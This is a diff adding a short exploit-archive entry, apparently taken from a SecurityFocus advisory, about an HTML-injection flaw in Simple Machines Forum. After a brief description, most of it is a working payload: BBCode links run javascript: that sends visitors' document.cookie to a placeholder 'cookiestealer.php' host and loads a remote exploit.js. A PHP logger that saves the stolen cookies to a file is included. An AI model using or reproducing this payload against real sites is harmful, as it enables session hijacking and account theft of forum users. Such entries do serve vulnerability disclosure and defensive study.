@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/33595/info
+
+Simple Machines Forum is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible. 
+
+[center][size=14pt][url=][/url][/size] [url=javascript:document.write('<iframe width="0%" height="0%" src="http://www.example.com/cookiestealer.php?cookie=' + document.cookie +'"> frameborder="0%">');][img]http://www.example2.com/intl/es_mx/images/logo.gif[/img][/center] PHP Cookie Stealer: <?php $cookie = $_GET['cookie']; $handler = fopen('cookies.txt', 'a'); fwrite($handler, $cookie."\n"); ?> [url=javascript:document.write(unescape(%3Cscript+src%3D%22http%3A%2F%2Fwww.example.com%2Fexploit.js%22%3E%3C%2Fscript%3E))][img]http://www.example2.com/sample.png[/img][/center] 
